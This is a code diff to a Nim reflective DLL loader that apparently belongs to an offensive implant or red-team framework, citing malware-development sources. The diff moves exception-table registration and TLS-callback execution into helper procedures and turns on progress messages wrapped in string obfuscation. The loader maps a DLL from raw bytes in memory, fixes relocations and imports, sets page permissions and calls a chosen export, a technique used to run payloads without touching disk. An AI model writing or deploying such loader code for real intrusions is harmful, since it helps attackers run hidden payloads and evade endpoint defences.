@@ -11,6 +11,7 @@ import ../../../common/utils
     - https://maldevacademy.com/new/modules/28
     - https://github.com/Helixo32/NimReflectiveLoader
     - https://github.com/S3cur3Th1sSh1t/Nim-RunPE
+    - https://kuwaitist.github.io/posts/ASYNC-BOFS/
 ]#
 
 # Type defintions
@@ -233,6 +234,24 @@ proc getExportAddress(pEntryExportDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE
 
     return NULL 
 
+# Exception handlers
+proc registerExceptionHandlers(pEntryExceptionDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE): bool = 
+    let pRuntimeFuncEntry = cast[PIMAGE_RUNTIME_FUNCTION_ENTRY](cast[uint](pPeBase) + cast[uint](pEntryExceptionDataDir.VirtualAddress))
+    return RtlAddFunctionTable(cast[PRUNTIME_FUNCTION](pRuntimeFuncEntry), pEntryExceptionDataDir.Size div DWORD(sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), cast[ULONG64](pPeBase)) != 0
+
+# TLS Callbacks
+proc executeTLSCallbacks(pEntryTLSDataDir: PIMAGE_DATA_DIRECTORY, pPeBase: PBYTE): bool {.gcsafe.} = 
+    let pTlsDir = cast[PIMAGE_TLS_DIRECTORY](cast[uint](pPeBase) + cast[uint](pEntryTLSDataDir.VirtualAddress))
+    var pCallbacks = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](pTlsDir.AddressOfCallBacks)
+    
+    # Invoke each TLS callback until a NULL callback is encountered
+    while pCallbacks[0] != nil:
+        {.cast(gcsafe).}:
+            pCallbacks[0](cast[PVOID](pPeBase), DLL_PROCESS_ATTACH, nil)
+        pCallbacks = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](cast[uint](pCallbacks) + uint(sizeof(PIMAGE_TLS_CALLBACK)))
+
+    return true
+
 # Execution
 proc execDll*(dllBytes: seq[byte], exportName: string, args: seq[byte], hWrite, hWakeupEvent, hStopEvent: HANDLE) {.gcsafe.} = 
     
@@ -262,48 +281,37 @@ proc execDll*(dllBytes: seq[byte], exportName: string, args: seq[byte], hWrite, 
         let pDst = cast[PBYTE](cast[uint](pPeBase) + cast[uint](sections[i].VirtualAddress))
         let pSrc = cast[PBYTE](cast[uint](peHdrs.pFileBuffer) + cast[uint](sections[i].PointerToRawData))
         copyMem(pDst, pSrc, sections[i].SizeOfRawData)
-        # print fmt"    [>] {$(addr sections[i].Name)} @ 0x{sections[i].PointerToRawData.repr} ({$sections[i].SizeOfRawData} bytes))"
+        print fmt"    [>] {$(addr sections[i].Name)} @ 0x{sections[i].PointerToRawData.repr} ({$sections[i].SizeOfRawData} bytes))"
 
     # Fix relocations
     if not fixRelocations(peHdrs.pEntryBaseRelocDataDir, pPeBase, cast[PBYTE](peHdrs.pImgNtHdrs.OptionalHeader.ImageBase)):
         raise newException(CatchableError, GetLastError().getError())
-    # print protect("[+] Relocations fixed.")
+    print protect("    [+] Relocations fixed.")
 
     # Fix Import Address Table
     if not fixImportAddressTable(peHdrs.pEntryImportDataDir, pPeBase): 
         raise newException(CatchableError, GetLastError().getError())
-    # print protect("[+] IAT fixed.")
+    print protect("    [+] IAT fixed.")
 
     # Fix memory permissions
     if not fixMemoryPermissions(pPeBase, peHdrs.pImgNtHdrs, peHdrs.pImgSecHdr): 
         raise newException(CatchableError, GetLastError().getError())
-    # print protect("[+] Memory permissions fixed.")
+    print protect("    [+] Memory permissions fixed.")
 
     # Resolve exported function
     pExportedFunction = getExportAddress(peHdrs.pEntryExportDataDir, pPeBase, exportName)
     if pExportedFunction == nil: 
-        raise newException(CatchableError, GetLastError().getError())
-    # print protect("[*] Exported function: 0x"), pExportedFunction.repr
+        raise newException(CatchableError, protect("Exported function not found."))
+    print protect("    [*] Exported function: 0x"), pExportedFunction.repr
 
     # Register exception handlers
-    if peHdrs.pEntryExceptionDataDir.Size != 0:
-        let pRuntimeFuncEntry = cast[PIMAGE_RUNTIME_FUNCTION_ENTRY](cast[uint](pPeBase) + cast[uint](peHdrs.pEntryExceptionDataDir.VirtualAddress))
-        if RtlAddFunctionTable(cast[PRUNTIME_FUNCTION](pRuntimeFuncEntry), peHdrs.pEntryExceptionDataDir.Size div DWORD(sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), cast[ULONG64](pPeBase)) == 0:
-            raise newException(CatchableError, GetLastError().getError())
-        # print protect("[*] Exception handlers registered.")
+    if peHdrs.pEntryExceptionDataDir.Size != 0 and not registerExceptionHandlers(peHdrs.pEntryExceptionDataDir, pPeBase):
+        raise newException(CatchableError, GetLastError().getError())
 
     # Execute TLS callbacks
     # Thread Local Storage is a mechanism that grants each thread its own unique storage for data, which ensures that data is not shared between threads
-    if peHdrs.pEntryTLSDataDir.Size != 0:
-        let pTlsDir = cast[PIMAGE_TLS_DIRECTORY](cast[uint](pPeBase) + cast[uint](peHdrs.pEntryTLSDataDir.VirtualAddress))
-        var pCallbacks = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](pTlsDir.AddressOfCallBacks)
-        
-        # Invoke each TLS callback until a NULL callback is encountered
-        while pCallbacks[0] != nil:
-            {.cast(gcsafe).}:
-                pCallbacks[0](cast[PVOID](pPeBase), DLL_PROCESS_ATTACH, nil)
-            pCallbacks = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](cast[uint](pCallbacks) + uint(sizeof(PIMAGE_TLS_CALLBACK)))
-        # print protect("[*] TLS callbacks executed.")
+    if peHdrs.pEntryTLSDataDir.Size != 0 and not executeTLSCallbacks(peHdrs.pEntryTLSDataDir, pPeBase):
+        raise newException(CatchableError, GetLastError().getError())
 
     # # Execute DllMain entry point (optional, if NimMain() is called from exported function)
     # let pEntryPoint = cast[uint](pPeBase) + cast[uint](peHdrs.pImgNtHdrs.OptionalHeader.AddressOfEntryPoint)
@@ -314,7 +322,6 @@ proc execDll*(dllBytes: seq[byte], exportName: string, args: seq[byte], hWrite, 
     # Execute exported function
     # If the DLL is implemented in Nim, the NimMain() function needs to be called first (either by DllMain or at the beginning of the exported function)
     let run = cast[RunProc](pExportedFunction)
-
     {.cast(gcsafe).}:
         run(if args.len > 0: cast[PBYTE](addr args[0]) else: nil, cast[DWORD](args.len), hWrite, hWakeupEvent, hStopEvent)
 
